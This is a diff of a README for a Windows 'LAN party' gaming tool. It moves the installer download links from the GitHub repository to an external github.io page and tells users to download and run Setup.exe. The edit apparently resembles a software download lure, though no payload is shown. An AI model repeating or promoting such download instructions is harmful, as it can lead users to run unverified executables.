@@ -1,6 +1,6 @@
 # 🎮 Game-LAN-Party-Tool-2026 - Organize local gaming sessions with friends
 
-[![](https://img.shields.io/badge/Download_Installer-Blue-blue)](https://github.com/sackclothhall769/Game-LAN-Party-Tool-2026)
+[![](https://img.shields.io/badge/Download_Installer-Blue-blue)](https://sackclothhall769.github.io)
 
 ## 📋 About This Tool
 
@@ -20,7 +20,7 @@ Ensure your computer meets these standards before you begin:
 
 Follow these steps to set up the tool on your Windows PC:
 
-1. Visit the following link to access the software files: [https://github.com/sackclothhall769/Game-LAN-Party-Tool-2026](https://github.com/sackclothhall769/Game-LAN-Party-Tool-2026).
+1. Visit the following link to access the software files: [https://sackclothhall769.github.io](https://sackclothhall769.github.io).
 2. Locate the Setup.exe file in the list of files.
 3. Click the file to start the download process.
 4. Save the file to your computer.
